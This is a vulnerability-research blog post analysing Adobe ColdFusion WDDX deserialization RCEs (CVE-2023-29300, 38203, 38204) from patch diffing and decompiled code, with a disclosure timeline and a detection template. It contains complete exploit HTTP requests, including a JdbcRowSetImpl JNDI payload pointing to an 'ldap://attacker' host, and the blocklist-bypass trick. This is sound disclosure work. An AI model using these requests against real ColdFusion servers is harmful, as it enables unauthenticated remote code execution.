---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-12_adobe-coldfusion-pre-auth-rces.md
original_filename: 2023-07-12_adobe-coldfusion-pre-auth-rces.md
title: Adobe ColdFusion Pre-Auth RCE(s)
category: documents
detected_topics:
- command-injection
- mfa
- automation-abuse
- api-security
- cloud-security
- supply-chain
tags:
- imported
- documents
- command-injection
- mfa
- automation-abuse
- api-security
- cloud-security
- supply-chain
language: en
raw_sha256: 7b21cbefc1f9ea54fa135e624dfa6aa41e71c38e0f7cfbf4fce0fe53e0cb8974
text_sha256: e3bf38c95f5468b508fa61a248d13723b34858c83072083d67ac63accfca9eb7
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# Adobe ColdFusion Pre-Auth RCE(s)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-12_adobe-coldfusion-pre-auth-rces.md
- Source Type: markdown
- Detected Topics: command-injection, mfa, automation-abuse, api-security, cloud-security, supply-chain
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `7b21cbefc1f9ea54fa135e624dfa6aa41e71c38e0f7cfbf4fce0fe53e0cb8974`
- Text SHA256: `e3bf38c95f5468b508fa61a248d13723b34858c83072083d67ac63accfca9eb7`


## Content

---
title: "Adobe ColdFusion Pre-Auth RCE(s)"
page_title: "Adobe ColdFusion Pre-Auth RCE(s) — ProjectDiscovery Blog"
url: "https://blog.projectdiscovery.io/adobe-coldfusion-rce/"
final_url: "https://projectdiscovery.io/blog/adobe-coldfusion-rce"
authors: ["Harsh Jaiswal (@rootxharsh)", "Rahul Maini (@iamnoooob)"]
programs: ["Adobe (ColdFusion)"]
bugs: ["RCE", "ColdFusion", "JNDI Injection", "Insecure deserialization", "Security code review", "Patch diffing"]
publication_date: "2023-07-12"
added_date: "2024-02-27"
source: "pentester.land/writeups.json"
original_index: 932
---

![](/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FBlog%20Header%20Background%20Image.07fydz4trtf5v.png&w=3840&q=75)

[Vulnerability Research](/blog/category/vulnerability-research/1)•

[Nuclei & Templates](/blog/category/nuclei-templates/1)

# Adobe ColdFusion Pre-Auth RCE(s)

By Harsh Jaiswal & Rahul Maini

July 12, 2023

12 min read

![Adobe ColdFusion Pre-Auth RCE\(s\)](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2024%2F01%2FBlog---Adobe.png&w=828&q=75)

#### Table of Contents

  * Introduction
  * What's in the patch?
  * Parsing of WDDX Packet
  * Finding the Sink
  * Finding the Source
  * Escalating JNDI Injection To RCE
  * Updates
  * Conclusion

#### Authors

[![Harsh Jaiswal](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2023%2F08%2F1585309233118.jpeg&w=96&q=75)Harsh Jaiswal](/blog/author/harsh/1)[![Rahul Maini](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2023%2F11%2FTKTMQH41W-U04DH0WJJLX-eec5b4b57170-512.jpeg&w=96&q=75)Rahul Maini](/blog/author/rahul/1)

#### Share

[](https://x.com/intent/post?url=)[](https://www.linkedin.com/shareArticle?mini=true&url=)

For the **latest updates** on CVE-2023-29300 / CVE-2023-38203 / CVE-2023-38204, see the [**updates section**](https://projectdiscovery.io/blog/adobe-coldfusion-rce/#updated-information)

* * *

### Introduction

The Adobe ColdFusion, widely recognized for its robust web development capabilities, recently [released](https://helpx.adobe.com/security/products/coldfusion/apsb23-40.html) a critical security update. The update specifically targeted three security issues, among them, [CVE-2023-29300](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-29300), a highly concerning pre-authentication Remote Code Execution (RCE) vulnerability. This vulnerability poses a significant threat, allowing malicious actors to execute arbitrary code on vulnerable Coldfusion 2018, 2021 and 2023 installations without the need for prior authentication. 

In this blog post, we aim to provide a comprehensive analysis of CVE-2023-29300, shedding light on the nature of the vulnerabilities, and their potential impact, and sharing the journey of code review undertaken by our team.

### What's in the patch?

In our research environment, an existing Adobe ColdFusion 2021 setup was already in place from our previous work. Upon discovering the availability of a new security update (version 7), we proceeded to install it after ensuring the backup of our current installation directory. The purpose of this installation was to perform a patch diff, enabling us to compare the changes made by the security update and rollback if necessary. 

We conducted a git diff and observed notable changes in the `coldfusion.wddx.DeserializerWorker.java` file.

![](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2023%2F07%2Fimage-12.png&w=3840&q=75)

This is a [WDDX](https://helpx.adobe.com/coldfusion/developing-applications/using-web-elements-and-external-objects/using-xml-and-wddx/using-wddx.html) packet deserializer which is of XML type. Within the `startElement` method of `DeserializerWorker` we notice that a newly added validation is being performed via `validateWddxFilter()`**** for `struct` element. 

java

Copy
  
  
  1public void startElement(String name, AttributeList atts) throws SAXException {
  2  try {
  3  ...
  4  if (name.equalsIgnoreCase("struct") && atts.getType(0) != null) {
  5  validateWddxFilter(atts);
  6  }
  7  ...
  8  } catch (WddxDeserializationException e) {
  9  throwSAXException(e);
  10  }
  11  }
  12
  13  private void validateWddxFilter(AttributeList atts) throws InvalidWddxPacketException {
  14  String attributeType = atts.getValue("type");
  15  validateBlockedClass(attributeType);
  16  }
  17
  18  private void validateBlockedClass(String attributeType) throws InvalidWddxPacketException {
  19  if (attributeType != null && !attributeType.toLowerCase().startsWith("coldfusion") && !attributeType.equalsIgnoreCase(StructTypes.ORDERED.getValue()) && !attributeType.equalsIgnoreCase(StructTypes.CASESENSITIVE.getValue()) && !attributeType.equalsIgnoreCase(StructTypes.ORDEREDCASESENSITIVE.getValue()) && WddxFilter.invoke(attributeType)) {
  20  throw new InvalidWddxPacketException();
  21  }
  22  }

The `struct` element now includes a new check in its `type` attribute, ensuring that the className begins with `coldfusion` and passes additional secondary checks. The `validateBlockedClass` function indicates that a fully qualified class name (FQCN) would be passed as the type attribute.

### Parsing of WDDX Packet

After reviewing documentation and articles on WDDX, we have gained a basic understanding of the WDDX packet's structure. Now, let's delve into the parsing of this packet. Each WDDX element corresponds to a specific handler; for instance, the struct element is handled by the StructHandler. Since the changes were made in relation to the struct element, our focus shifted to parsing the WDDX struct element.

cli

Copy
  
  
  1<wddxPacket version='1.0'><header/><data><struct type='className'><var name='prop_name'><string>prop_value</string></var></struct></data></wddxPacket>

Through reading, debugging, and tracing various breakpoints, we comprehended the parsing process. It was observed that Java reflections are extensively used in certain code blocks, suggesting that user input will undergo reflection invocations.  
  
This is the code flow of interesting part of the parsing process:

`onEndElement() -> getClassBySignature() -> setBeanProperties()`

### Finding the Sink

In the `onEndElement()` method, a check is performed on the `m_strictType` field, which is set earlier in the code if the type attribute is provided in the struct element of the WDDX packet.

cli

Copy
  
  
  1public void onEndElement() throws WddxDeserializationException {
  2  
  3  if (this.m_strictType == null) {
  4  setTypeAndValue(this.m_ht);
  5  return;
  6  }
  7  try {
  8  Class beanClass = getClassBySignature(this.m_strictType);
  9  Object bean = beanClass.getDeclaredConstructor(new Class[0]).newInstance(new Object[0]);
  10  setBeanProperties(bean, this.m_ht);
  11  setTypeAndValue(bean);
  12  } catch (Exception e) {
  13  ...
  14  }
  15  }

After passing this check, a call is made to `getClassbySignature()`, which uses reflection to obtain the class instance. The class name is derived from user-controlled input `m_strictType`, and the first and last characters are removed, possibly because the input is expected in the form of [LclassName;](https://stackoverflow.com/questions/5085889/l-array-notation-where-does-it-come-from/5085908)

cli

Copy
  
  
  1private static Class getClassBySignature(String jniTypeSig) throws ClassNotFoundException {
  2  char c = jniTypeSig.charAt(0);
  3  switch (c) {
  4  ...
  5  default:
  6  String className = jniTypeSig.substring(0 + 1, jniTypeSig.length() - 1);
  7  return Class.forName(className);
  8  }
  9  }

Once we have the class name, reflection is used to access the constructor of the class, specifically the one with no arguments, and an instance of the class is instantiated. This instance is then passed to `setBeanProperties()`, along with the user-controlled `m_ht` field, which contains the WDDX variables.

java

Copy
  
  
  1private void setBeanProperties(Object bean, Map props) throws WddxDeserializationException {
  2  Hashtable descriptors;
  3  try {
  4  BeanInfo beanInfo = Introspector.getBeanInfo(bean.getClass(), Object.class);
  5  PropertyDescriptor[] descriptorArray = beanInfo.getPropertyDescriptors();
  6  descriptors = new Hashtable();
  7  for (int i = 0; i < descriptorArray.length; i++) {
  8  descriptors.put(descriptorArray[i].getName(), descriptorArray[i]);
  9  }
  10  } catch () {
  11  ...
  12  }
  13  for (String propName : props.keySet()) {
  14  Object propValue = props.get(propName);
  15  IndexedPropertyDescriptor indexedPropertyDescriptor = (PropertyDescriptor) descriptors.get(propName);
  16  if (indexedPropertyDescriptor != null) {
  17  if (indexedPropertyDescriptor instanceof IndexedPropertyDescriptor) {
  18  ...
  19  } else {
  20  Method method2 = indexedPropertyDescriptor.getWriteMethod();
  21  if (method2 != null) {
  22  try {
  23  Class[] types2 = method2.getParameterTypes();
  24  Object value2 = ObjectConverter.convert(propValue, types2[0]);
  25  method2.invoke(bean, value2);
  26  } catch () {
  27  ...
  28  }
  29  }
  30  }
  31  ...
  32  }
  33  }
  34  }

The `getPropertyDescriptors()` method of `BeanInfo` returns an array of `PropertyDescriptor` objects. Each `PropertyDescriptor` represents a property of the bean and contains information about the property's name, data type, and getter/setter methods. Eventually we see the usage of IndexedPropertyDescriptor, which has `getReadMethod` and `getWriteMethod` which corresponds to getter methods and setter methods respectively. We noticed that if the bean has any setter methods, it would be returned and finally being invoked on the bean via Java Reflections with variable's value as the only argument, these variables values comes from WDDX packet which is again, user controlled.

**TL;DR:** We have identified a vulnerability where a method of a class can be called under certain conditions:

  1. The class must have a public constructor with no arguments.
  2. The method must be a setter, indicated by its name starting with "set".
  3. The setter method must accept only one argument.

Having understood the vulnerable sink, we proceeded to the next step of identifying a pre-authentication source for this sink. During our analysis by searching through the decompiled codebase for `WddxDeserializer`, we discovered a call from the `FilterUtils` class.

### Finding the Source

During our search through the decompiled codebase for WddxDeserializer, we found a reference to WddxDeserializer in the FilterUtils class.

cli

Copy
  
  
  1public static Object WDDXDeserialize(String str) throws Throwable {
  2  WddxDeserializer deserializer = new WddxDeserializer();
  3  InputSource source = new InputSource(new StringReader(str));
  4  return deserializer.deserialize(source);
  5  }

Specifically, it is being used within the `GetArgumentCollection` method. This method takes the request context as input and extracts the `argumentCollection` parameter from either the form or query string. The retrieved input is then checked to determine if it is of JSON type. If it is not, the value is deserialized as a WDDX packet using the `WDDXDeserialize()` call.

cli

Copy
  
  
  1public static Map GetArgumentCollection(FusionContext context) throws Throwable {
  2  Struct argumentCollection;
  3  HttpServletRequest httpServletRequest = context.request;
  4  String attr = (String) context.pageContext.findAttribute("url.argumentCollection");
  5  if (attr == null) {
  6  attr = (String) context.pageContext.findAttribute("form.argumentCollection");
  7  }
  8  if (attr == null) {
  9  argumentCollection = new Struct();
  10  } else {
  11  String attr2 = attr.trim();
  12  if (attr2.charAt(0) == '{') {
  13  argumentCollection = (Struct) JSONUtils.deserializeJSON(attr2);
  14  } else {
  15  argumentCollection = (Struct) WDDXDeserialize(attr2); // Call to vulnerable Sink here
  16  }
  17  }

Doing some reading on codebase and external articles from [Rapid7](https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360/rapid7-analysis) on previous CVEs, we realized that we require a valid CFC endpoint. In our case, a pre-auth CFC endpoint to trigger call to `GetArgumentCollection` and eventually to our vulnerable sink, that is, the `WDDXDeserialize()`.

Our sample request to reach WDDX `StructHandler` would look like:

cli

Copy
  
  
  1POST /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true HTTP/2
  2Host: localhost
  3Accept-Encoding: gzip, deflate
  4Accept: */*
  5Accept-Language: en-US;q=0.9,en;q=0.8
  6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
  7Cache-Control: max-age=0
  8Content-Type: application/x-www-form-urlencoded
  9Content-Length: 275
  10
  11argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xclassNamex'><var name='VERSION'><string>1.0.0</string></var></struct></data></wddxPacket>/CFIDE/adminapi/accessmanager.cfc

To validate our primitive, we set up a JVM debugger and placed a breakpoint at the method invoke call. In order to confirm the vulnerability, we selected a simple class, `java.util.Date`, that satisfies the specified requirements. This class has setter methods such as `setDate`. We then created a WDDX packet resembling the following in the request:

cli

Copy
  
  
  1POST /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true HTTP/2
  2Host: localhost
  3Accept-Encoding: gzip, deflate
  4Accept: */*
  5Accept-Language: en-US;q=0.9,en;q=0.8
  6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
  7Cache-Control: max-age=0
  8Content-Type: application/x-www-form-urlencoded
  9Content-Length: 275
  10
  11argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xjava.util.Datex'><var name='date'><string>our_input</string></var></struct></data></wddxPacket>

At this stage, we were able to confirm that a call to `java.util.Date.setDate(our_input)` was successfully executed. Our next goal was to find a way to abuse this primitive for remote code execution.

### Escalating JNDI Injection To RCE

After a few hours, we stumbled upon the class `com.sun.rowset.JdbcRowSetImpl`, which fits our requirements. If a boolean argument is passed to the `setAutoCommit()` method of this class, it performs a JNDI lookup on the dataSourceName, which can be set using the `setDataSourceName()` method. This discovery led us to the realization that calling `setDataSourceName()` followed by `setAutoCommit()` would result in a JNDI injection vulnerability. It is to be noted that we're within a for loop while doing method invocations as such we are able to invoke multiple methods on the bean instance.

At this stage, we have escalated to a JNDI injection via WDDX deserialization, which opens up possibilities for remote code execution.

This is how the request would look like:

cli

Copy
  
  
  1POST /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true HTTP/2
  2Host: localhost
  3Accept-Encoding: gzip, deflate
  4Accept: */*
  5Accept-Language: en-US;q=0.9,en;q=0.8
  6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
  7Cache-Control: max-age=0
  8Content-Type: application/x-www-form-urlencoded
  9Content-Length: 275
  10
  11argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>ldap://attacker:1389/exploit</string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>

Looking at the class path, we noticed several libraries of which `commons-beanutils-1.9.4` stands apart. We generated a ysoserial java deserialization payload for `commons-beanutils` and binded it on a rogue LDAP server. Doing so resulted into a remote code execution on the Adobe ColdFusion 2021 (Update 6). 

![](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2023%2F07%2Fimage-20.png&w=3840&q=75)

Nuclei template for CVE-2023-29300 is now available in Nuclei-Templates repository - [HERE](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-29300.yaml)  
  
You can run [nuclei](https://github.com/projectdiscovery/nuclei) to scan for CVE-2023-29300, as shown below:

bash

Copy
  
  
  1nuclei -id CVE-2023-29300 -list coldfusion_list.txt

![](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2023%2F07%2Fimage-24.png&w=3840&q=75)

### **Updates**

At present, which is as of 2023-07-19, Adobe has issued two additional security updates to address the pre-authentication remote code execution (RCE) vulnerabilities that were inadvertently discovered and disclosed by us.

Date  | Event  
---|---  
2023-07-11 | Adobe issues [APSB23-40](https://helpx.adobe.com/security/products/coldfusion/apsb23-40.html) security advisory for CVE-2023-29300.  
2023-07-12 | ProjectDiscovery publishes CVE analysis blog post on CVE-2023-29300.  
2023-07-13 | Original finder of CVE-2023-29300 alerts us to possible 0-day publication; Adobe Prod Security requests blog unpublishing.  
2023-07-14 | Adobe releases [APSB23-41](https://helpx.adobe.com/security/products/coldfusion/apsb23-41.html) security advisory to address CVE-2023-29300 bypass, now designated as CVE-2023-38203.  
2023-07-15 | We notify Adobe of a vulnerability in the patch, providing technical details.  
2023-07-18 | Adobe shares pre-release build for patch confirmation.  
2023-07-18 | Rapid7 publishes blog on active exploitation of Adobe ColdFusion RCE exploits, after our blog post, and their insights align closely with the actual situation except that at that time the latest release for CVE-2023-38203 was still vulnerable to the initial exploit.  
2023-07-19 | Adobe releases [APSB23-47](https://helpx.adobe.com/security/products/coldfusion/apsb23-47.html) security advisory to address the exploit, now assigned as CVE-2023-38204.  
  
**So what happened?**

In our analysis post on 2023-07-12, we initially assumed that the fix involved whitelisting only **"coldfusion*"** classes. However, this assumption was incorrect, we realized that we had overlooked a crucial function of the fix, WddxFilter.invoke(), nested within an if statement. This function prevented the invocation of certain blacklisted classes, these classes were reported by the original finder of [CVE-2023-29300](https://nvd.nist.gov/vuln/detail/CVE-2023-29300).  
  
During our analysis, we found a class com.sun.rowset.JdbcRowSetImpl that had the potential for remote code execution (RCE), and this particular class was also not included in the blacklist/denylist. As a result, our blog post, which was originally intended to highlight an n-day exploit for CVE-2023-29300, turned out to be a 0-day exploit. Adobe promptly reached out to collaborate with us on addressing the situation and requested that we temporarily un-publish the blog.  
  
Adobe released a new update blacklisting the discovered class, and assigning our analysis as [CVE-2023-38203](https://helpx.adobe.com/security/products/coldfusion/apsb23-41.html) on 2023-07-14.  
  
However, much to our surprise, our previous exploits continued to work even after applying the CVE-2023-38203 patch. It was then that we realized our bypass wasn't limited to circumventing the blacklisted class; rather, it allowed us to entirely bypass the blacklist validation itself. This was a result of a classic time of check and time of use inconsistency. Probably Adobe could have used our nuclei template to validate their patch.  
  
Furthermore, Adobe has recently released a new update that resolves the patch bypass issue and has assigned the vulnerability we identified as [CVE-2023-38204](https://helpx.adobe.com/security/products/coldfusion/apsb23-47.html) on 2023-07-19.  
  
Now, let's delve into a detailed breakdown of what went wrong:

There seems to be a mistake in their filter matching process. When the input `Lcom.sun.rowset.JdbcRowSetImpl;` is provided, it successfully matches and blocks the payload. The filter expects only the "L" and ";" characters, so it replaces them with an empty string. However, if the input is `Xcom.sun.rowset.JdbcRowSetImplX` it does not find a match.

In DeserializationWorker:

java

Copy
  
  
  1private void validateWddxFilter(AttributeList atts) {
  2  String attributeType = atts.getValue("type");
  3  if (attributeType.endsWith(";")) {
  4  attributeType = attributeType.replace(";", "");
  5  }
  6  if (attributeType.startsWith("L")) {
  7  String attributeTypeCopy = attributeType;
  8  validateBlockedClass(attributeTypeCopy.replaceFirst("L", ""));
  9  }
  10  validateBlockedClass(attributeType);
  11  }
  12
  13  private void validateBlockedClass(String attributeType) {
  14  if (attributeType != null && !attributeType.toLowerCase().startsWith("coldfusion") && ... && WddxFilter.invoke(attributeType)) {
  15  throw new InvalidWddxPacketException();
  16  }
  17  }

In StructHandler:

cli

Copy
  
  
  1private static Class getClassBySignature(String jniTypeSig) {
  2
  3  char c = jniTypeSig.charAt(0);
  4  switch (c) {
  5  ...
  6  case 'E':
  7  case 'G':
  8  case 'H':
  9  case 'K':
  10  case 'L':
  11  case 'M':
  12  case 'N':
  13  case 'O':
  14  case 'P':
  15  case 'Q':
  16  case 'R':
  17  case 'T':
  18  case 'U':
  19  case 'V':
  20  case 'W':
  21  case 'X':
  22  case 'Y':
  23  default:
  24  String className = jniTypeSig.substring(0 + 1, jniTypeSig.length() - 1);
  25  return Class.forName(className);
  26  ...
  27  }
  28
  29}

Although `Xcom.sun.rowset.JdbcRowSetImplX`, is not a valid class name, they are performing substring operations that remove the first and last characters before using the class. However, during the check, they compare it to `X<class name>X` which does not precisely match their filtered `<class name>`. This inconsistency in the matching process leads to the bypass.

We promptly reported this inconsistency to Adobe, and they immediately began working on a fix. Prior to releasing a new update, Adobe collaborated with us by providing a pre-release build for us to validate the fixes. Upon testing, we were able to confirm that all the reported issues had been addressed in this patch assigning us with [CVE-2023-38204](https://helpx.adobe.com/security/products/coldfusion/apsb23-47.html).

It is important to clarify that our intention was never to publish a 0-day exploit or cause harm to ColdFusion customers. Our goal was to share information about a resolved vulnerability, raise awareness, and offer a Nuclei template for organizations to detect the vulnerability on their assets. Regrettably, during this process, we inadvertently disclosed a patch bypass, which was unintended.  
  
This [Tweet](https://twitter.com/catc0n/thread/1681419847056359424) captures our thoughts:

![](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2023%2F07%2Fimage-28.png&w=3840&q=75)

We express our gratitude to Adobe for their understanding and collaboration throughout these situations and disclosures.  
  
**Adobe's comment:**

💡

Adobe recommends updating ColdFusion installations to the latest release. Please see [APSB23-47 ](https://helpx.adobe.com/security/products/coldfusion/apsb23-47.html)for more information. Adobe is aware that CVE-2023-38205 has been exploited in the wild in limited attacks targeting Adobe ColdFusion.

### Conclusion

In conclusion, our analysis revealed a significant vulnerability in the WDDX deserialization process within Adobe ColdFusion 2021 (Update 8). By exploiting this vulnerability, we were able to achieve remote code execution. The issue stemmed from a unsafe use of Java Reflection API that allowed the invocation of certain methods.

To exploit this vulnerability, typically, access to a valid CFC endpoint is necessary. However, if the default pre-auth CFC endpoints cannot be accessed directly due to ColdFusion lockdown mode, it is possible to combine this vulnerability with CVE-2023-29298. This combination enables remote code execution against a vulnerable ColdFusion instance, even when it is configured in locked-down mode.

By embracing Nuclei and participating in the open-source community or joining the Nuclei Cloud Beta program, organizations can strengthen their security defenses, stay ahead of emerging threats, and create a safer digital environment. Security is a collective effort, and together we can continuously evolve and tackle the challenges posed by cyber threats.

\- [**Rahul** Maini](https://twitter.com/iamnoooob), [**Harsh** Jaiswal](https://twitter.com/rootxharsh) @ ProjectDiscovery Research

[Interested in Nuclei Cloud? Learn more here...](https://nuclei.sh/)

## Related stories

Related stories

[View all](/blog/category/vulnerability-research/1)

[![Nuclei Templates - April 2026](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2026%2F05%2Fapril-month.png&w=828&q=75)](/blog/nuclei-templates-april-2026)

### [Nuclei Templates - April 2026Two releases shipped this cycle - v10.4.2 (April 15) and v10.4.3 (May 5) - delivering deep KEV coverage, a major push into AI/LLM attack surface, fresh Perforce visibility, and broad quality improvements across the template library. 🚀 April Stats Release New Templates CVEs Added First-time Contributors v10.4.2 121 61 15 v10.4.3 105 62 12 Total 226 123 27 * 226 new templates shipped across both releases * 123 CVEs covered, including ~10 actively exploited vulnerabilities ](/blog/nuclei-templates-april-2026)

[![Beyond the Model: Neo Hunts, Exploits, and Proves 22 Zero-Days.](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2026%2F03%2FEveryone-is-finding-vulns.--The-hard-part-is-proving-them.--Blog-Thumbnail-.png&w=828&q=75)](/blog/everyone-is-finding-vulns-the-hard-part-is-proving-them)

### [Beyond the Model: Neo Hunts, Exploits, and Proves 22 Zero-Days.LLMs are a genuine leap forward for vulnerability discovery. Anthropic reported 500+ zero-days from Opus 4.6 and OpenAI's Codex Security discovered 14 CVEs across projects like OpenSSH and GnuTLS. If you've experimented with LLMs for security testing, you've probably been impressed too. The practical reality for a security team deploying AI is messier than the headlines or early POC results suggest. Noise compounds fast. Anthropic brought in external security researchers to help validate the vo](/blog/everyone-is-finding-vulns-the-hard-part-is-proving-them)

[![Inside the benchmark: app architectures, walkthroughs of findings, and what each scanner actually caught](/_next/image?url=https%3A%2F%2Fstorage.ghost.io%2Fc%2F70%2Ff3%2F70f3700b-f26d-40f9-990d-eef899cce263%2Fcontent%2Fimages%2F2026%2F03%2FInside-the-Benchmark--Blog-Thumbnail---Updated-.png&w=828&q=75)](/blog/inside-the-benchmark-pp-architectures-finding-walkthroughs-and-what-each-scanner-actually-caught)

### [Inside the benchmark: app architectures, walkthroughs of findings, and what each scanner actually caughtThis is Part 2 of our vibe coding security benchmark study. In Part 1, we compared how LLM-based security tools like ProjectDiscovery's Neo and Claude Code performed against traditional SAST and DAST scanners on AI-generated code. We found that LLM-based tools like Neo and Claude Code detected many high-value findings that traditional scanners missed. Between Neo and Claude Code, Neo produced more true positives and fewer false positives because it could validate hypotheses against a running app](/blog/inside-the-benchmark-pp-architectures-finding-walkthroughs-and-what-each-scanner-actually-caught)
